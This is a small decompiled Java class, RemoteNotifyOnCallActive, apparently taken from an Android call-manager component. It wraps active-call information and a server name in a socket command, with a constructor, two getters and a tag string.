package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.ActiveCallInfo;

public class RemoteNotifyOnCallActive
  extends SocketCmd
{
  private static final long serialVersionUID = 2797374315303043602L;
  private String mServerName;
  
  public RemoteNotifyOnCallActive(ActiveCallInfo paramActiveCallInfo, String paramString)
  {
    super(paramActiveCallInfo, Boolean.class);
    this.mServerName = paramString;
  }
  
  protected String getServerName()
  {
    return this.mServerName;
  }
  
  protected String getTag()
  {
    return "RemoteNotifyOnCallActive";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteNotifyOnCallActive.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */